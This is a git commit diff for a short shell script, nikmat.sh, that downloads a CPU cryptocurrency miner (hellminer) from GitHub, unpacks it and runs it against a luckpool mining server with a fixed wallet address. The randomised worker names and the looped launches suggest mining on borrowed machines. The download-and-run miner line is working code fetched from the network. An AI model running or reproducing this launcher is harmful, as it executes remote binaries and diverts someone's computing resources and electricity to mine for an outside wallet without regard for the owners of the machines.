975e54a91970a01f48f2d100e334df0b465e7c73
verus0001 <91267202+verus0001@users.noreply.github.com>
2021-09-23 21:31:53 +0800

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -3,15 +3,10 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
 
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&
 ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-20 -n 1)Tester) -p --cpu 4
 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
 
 
      echo COUNTER $COUNTER
